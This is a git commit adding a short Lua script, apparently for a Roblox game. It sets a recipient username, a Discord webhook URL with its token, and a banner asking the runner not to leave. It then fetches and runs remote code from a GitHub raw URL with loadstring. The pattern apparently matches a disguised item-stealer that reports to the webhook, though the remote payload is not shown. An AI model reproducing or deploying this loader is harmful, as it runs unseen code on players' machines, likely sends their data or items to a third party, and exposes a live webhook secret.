5e56cfbf6109b51d6dc7ce7838e6628d4bd5ba67
aekhalism <133611896+aekhalism@users.noreply.github.com>
2023-05-15 08:58:53 +0700

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,4 @@
+_G.Name user="muaxuan1204"
+_G.HubName = "Auto Comet script are loading, please don't leave"
+_G.WebhookUrl = "discord.com/api/webhooks/1107132008775286834/5qTqO1pmibA7H5c9eedKDSn22cME7uSDwYyfS_mnT5Ut0jrkJWLdQyPhuvZXvL9l84l6"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
